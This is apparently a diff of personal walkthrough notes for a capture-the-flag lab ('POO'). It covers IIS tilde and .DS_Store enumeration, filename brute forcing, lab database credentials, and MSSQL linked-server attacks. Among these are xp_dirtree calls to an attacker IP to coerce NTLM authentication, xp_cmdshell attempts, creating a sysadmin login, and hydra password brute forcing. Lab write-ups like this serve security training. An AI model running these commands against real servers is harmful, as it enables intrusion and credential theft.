@@ -137,24 +137,240 @@ Results:
 ```
 => File: `/.DS_Store`
 
+## ds_walk
+
+```bash
+python3 ~/Hacking/tools/DS_Walk/ds_walk.py -u http://compatibility.intranet.poo/
+```
+Results:
+```
+[!] .ds_store file is present on the webserver.
+[+] Enumerating directories based on .ds_server file:
+----------------------------
+[!] http://compatibility.intranet.poo//admin
+[!] http://compatibility.intranet.poo//dev
+[!] http://compatibility.intranet.poo//iisstart.htm
+[!] http://compatibility.intranet.poo//Images
+[!] http://compatibility.intranet.poo//JS
+[!] http://compatibility.intranet.poo//META-INF
+[!] http://compatibility.intranet.poo//New folder
+[!] http://compatibility.intranet.poo//New folder (2)
+[!] http://compatibility.intranet.poo//Plugins
+[!] http://compatibility.intranet.poo//Templates
+[!] http://compatibility.intranet.poo//Themes
+[!] http://compatibility.intranet.poo//Uploads
+[!] http://compatibility.intranet.poo//web.config
+[!] http://compatibility.intranet.poo//Widgets
+----------------------------
+[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1
+[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc
+----------------------------
+[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1/core
+[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1/db
+[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1/include
+[!] http://compatibility.intranet.poo//dev/304c0c90fbc6520610abbf378e2339d1/src
+----------------------------
+[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc/core
+[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc/db
+[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc/include
+[!] http://compatibility.intranet.poo//dev/dca66d38fd916317687e1390a420c3fc/src
+----------------------------
+[!] http://compatibility.intranet.poo//Images/buttons
+[!] http://compatibility.intranet.poo//Images/icons
+[!] http://compatibility.intranet.poo//Images/iisstart.png
+----------------------------
+[!] http://compatibility.intranet.poo//JS/custom
+----------------------------
+[!] http://compatibility.intranet.poo//Themes/default
+----------------------------
+[!] http://compatibility.intranet.poo//Widgets/CalendarEvents
+[!] http://compatibility.intranet.poo//Widgets/Framework
+[!] http://compatibility.intranet.poo//Widgets/Menu
+[!] http://compatibility.intranet.poo//Widgets/Notifications
+----------------------------
+[!] http://compatibility.intranet.poo//Widgets/Framework/Layouts
+----------------------------
+[!] http://compatibility.intranet.poo//Widgets/Framework/Layouts/custom
+[!] http://compatibility.intranet.poo//Widgets/Framework/Layouts/default
+----------------------------
+[*] Finished traversing. No remaining .ds_store files present.
+[*] Cleaning up .ds_store files saved to disk.
+```
+=> However none of the enumerated files/dirs are accessible (403 Forbidden)
+
+## IIS Tilde vulnerability
+
+Check if vulnerable:
+```bash
+shortscan --isvuln http://compatibility.intranet.poo/
+# URL: http://compatibility.intranet.poo/
+# Running: Microsoft-IIS/10.0
+# Vulnerable: Yes!
+```
+
+Enum files (tried more paths from DS_walk output, but only the one with results is shown below):
+```bash
+shortscan 'http://compatibility.intranet.poo/dev/304c0c90fbc6520610abbf378e2339d1/db'
+# POO_CO~1.TXT         POO_CO?.TXT?
+```
+=> there is a txt file which filename starts with `poo_co`
+
+Create wordlist with words that start with "co":
+```bash
+grep "^co" /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt > poo.wordlist.txt
+```
+
+Brute force filenames:
+```bash
+ffuf -u http://compatibility.intranet.poo/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt -w poo.wordlist.txt
+# connection
+```
+
+Access file:
+```bash
+curl http://compatibility.intranet.poo/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
+# SERVER=10.13.38.11
+# USERID=external_user
+# DBNAME=POO_PUBLIC
+# USERPWD=#p00Public3xt3rnalUs3r#
+
+# Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}
+```
+
 ---
 # MSSQL / 1433
 
+Connect:
 ```bash
-sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 -oN mssql_p1433.nmap compatibility.intranet.poo
+impacket-mssqlclient external_user@compatibility.intranet.poo
+# PW: #p00Public3xt3rnalUs3r#
 ```
-=> nothing new
 
-Default creds:
-```bash
-# Try default creds
-impacket-mssqlclient sa@compatibility.intranet.poo
-# Password123
+Version:
 ```
-=> Nope
+select @@version;
 
-Brute force:
-```bash
-hydra -I -e nsr -l sa -P /usr/share/wordlists/rockyou.txt compatibility.intranet.poo mssql -t2 -vv
+Microsoft SQL Server 2017 (RTM-GDR) (KB5040942) - 14.0.2056.2 (X64) 
+        Jun 20 2024 11:02:32 
+        Copyright (C) 2017 Microsoft Corporation
+        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
 ```
-=> had to abort, its to slow..
+
+Responder:
+```
+EXEC MASTER.sys.xp_dirtree '\\10.10.14.17\test', 1, 1;
+EXEC MASTER.sys.xp_fileexist '\\10.10.14.17\test';
+EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1', NULL, 1;
+```
+=> the commands dont work
+
+## Linked Servers
+
+There is another linked server `COMPATIBILITY\POO_CONFIG`:
+```sql
+enum_links
+[%] EXEC sp_linkedservers
+SRV_NAME                   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE             SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
+------------------------   ----------------   -----------   ------------------------   ------------------   ------------   -------   
+COMPATIBILITY\POO_CONFIG   SQLNCLI            SQL Server    COMPATIBILITY\POO_CONFIG   NULL                 NULL           NULL      
+COMPATIBILITY\POO_PUBLIC   SQLNCLI            SQL Server    COMPATIBILITY\POO_PUBLIC   NULL                 NULL           NULL
+```
+
+Enumerate databases:
+```sql
+EXEC ('select name from sys.databases;') AT [COMPATIBILITY\POO_CONFIG];
+[%] EXEC ('select name from sys.databases;') AT [COMPATIBILITY\POO_CONFIG];
+name         
+----------   
+master       
+tempdb       
+POO_CONFIG
+```
+
+Enumerate tables:
+```bash
+EXEC ('select * from POO_CONFIG.information_schema.tables;') AT [COMPATIBILITY\POO_CONFIG];
+# none
+
+EXEC ('SELECT COUNT(*) FROM POO_CONFIG.information_schema.tables;') AT [COMPATIBILITY\POO_CONFIG];
+# 0
+```
+=> no tables
+
+Further enum:
+```bash
+EXEC ('select @@version;') AT [COMPATIBILITY\POO_CONFIG];
+# same version
+
+# Cmd exec?
+EXEC ('EXECUTE xp_cmdshell ''whoami'';') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+EXEC ('EXECUTE sp_configure ''show advanced options'', 1;') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+
+# Credentials?
+EXEC ('SELECT * FROM msdb.dbo.syscachedcredentials;') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+
+# Backups?
+EXEC ('SELECT * FROM msdb.dbo.backupfile;') AT [COMPATIBILITY\POO_CONFIG];
+# none
+
+# Coerce auth?
+EXEC ('EXEC MASTER.sys.xp_dirtree ''\\10.10.14.17\test'', 1, 1;') AT [COMPATIBILITY\POO_CONFIG];
+# nope
+EXEC ('EXEC MASTER.sys.xp_fileexist ''\\10.10.14.17\test'';') AT [COMPATIBILITY\POO_CONFIG];
+# nope
+EXEC ('EXEC sp_OACreate ''WinHttp.WinHttpRequest.5.1'', NULL, 1;') AT [COMPATIBILITY\POO_CONFIG];
+# perm denied
+
+# Jobs
+EXEC ('EXEC xp_servicecontrol ''QUERYSTATE'', ''SQLServerAgent'';') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+EXEC ('EXEC msdb.dbo.sp_help_job;') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+
+EXEC ('EXEC sp_linkedservers;') AT [COMPATIBILITY\POO_CONFIG];
+# same linked servers
+
+EXEC ('SELECT SYSTEM_USER AS CurrentLogin;') AT [COMPATIBILITY\POO_CONFIG];
+# internal_user
+
+# Creds?
+EXEC ('SELECT name, password_hash FROM sys.sql_logins WHERE name = SYSTEM_USER;') AT [COMPATIBILITY\POO_CONFIG];
+# nothing
+
+# Stored Procedures?
+EXEC ('SELECT name FROM dbo.sysobjects WHERE (type = ''P'') AND LEFT(name, 3) NOT IN (''sp_'', ''xp_'', ''ms_'');') AT [COMPATIBILITY\POO_CONFIG];
+# none
+EXEC ('SELECT name FROM sys.procedures WHERE name LIKE ''xp%'';') AT [COMPATIBILITY\POO_CONFIG];
+# none
+
+EXEC ('SELECT job_id, name, enabled FROM msdb.dbo.sysjobs;') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+
+EXEC ('CREATE LOGIN newadmin WITH PASSWORD = ''password''; ALTER SERVER ROLE sysadmin ADD MEMBER newadmin;') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+
+EXEC ('SELECT * FROM OPENROWSET(BULK N''C:/Windows/System32/drivers/etc/hosts'', SINGLE_CLOB) AS Contents;') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+
+EXEC ('DECLARE @value nvarchar(4000); EXEC MASTER.sys.xp_regread ''HKEY_LOCAL_MACHINE'',''SOFTWARE\Microsoft\Windows NT\CurrentVersion'',''ProductName'',@value OUTPUT; SELECT @value AS WindowsVersion;') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+
+EXEC ('SELECT * FROM master.dbo.spt_fallback_db;') AT [COMPATIBILITY\POO_CONFIG];
+EXEC ('SELECT * FROM master.dbo.spt_fallback_dev;') AT [COMPATIBILITY\POO_CONFIG];
+EXEC ('SELECT * FROM master.dbo.spt_fallback_usg;') AT [COMPATIBILITY\POO_CONFIG];
+EXEC ('SELECT * FROM sys.backup_devices;') AT [COMPATIBILITY\POO_CONFIG];
+# nothing
+EXEC ('EXEC master.dbo.sp_monitor;') AT [COMPATIBILITY\POO_CONFIG];
+# denied
+
+EXEC ('SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER(''sysadmin'', name) = 1;') AT [COMPATIBILITY\POO_CONFIG];
+# sa
+
+EXEC ('SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE ''%password%'';') AT [COMPATIBILITY\POO_CONFIG];
+
+EXEC ('SELECT name AS DatabaseName, is_trustworthy_on, SUSER_SNAME(owner_sid) AS DatabaseOwner FROM sys.databases ORDER BY is_trustworthy_on DESC;') AT [COMPATIBILITY\POO_CONFIG];
+
+```
